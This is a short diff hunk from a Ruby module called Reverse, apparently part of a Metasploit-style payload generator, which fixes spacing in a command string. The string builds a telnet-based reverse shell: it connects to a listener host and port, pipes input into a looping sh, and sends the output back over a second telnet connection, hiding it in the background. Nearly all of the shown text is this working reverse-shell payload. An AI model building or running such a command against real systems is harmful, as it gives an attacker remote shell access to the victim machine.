@@ -48,7 +48,7 @@ module Reverse
 			"telnet #{datastore['LHOST']} #{datastore['LPORT']}|" +
 			"while : ; do sh && break; done 2>&1|" +
 			"telnet #{datastore['LHOST']} #{datastore['LPORT']}" +
-			">/dev/null 2>&1 &)"
+			" >/dev/null 2>&1 &)"
 		return cmd
 	end
 
